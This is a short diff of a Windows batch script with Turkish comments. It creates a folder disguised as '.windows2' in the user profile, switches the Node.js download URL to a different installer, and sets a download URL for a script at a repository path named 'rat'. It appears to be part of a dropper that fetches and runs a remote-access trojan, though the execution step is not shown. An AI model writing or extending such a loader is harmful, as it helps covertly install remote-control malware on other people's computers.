@@ -6,7 +6,7 @@ set "folderPath=%USERPROFILE%\.windows2"
 mkdir "%folderPath%" >nul 2>&1
 
 :: Node.js indirme URL'i
-set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.zip"
+set "nodeUrl=https://nodejs.org/dist/v20.2.0/node-v20.2.0-x86.msi"
 
 :: Script dosyasının indirme URL'i
 set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/a.js"
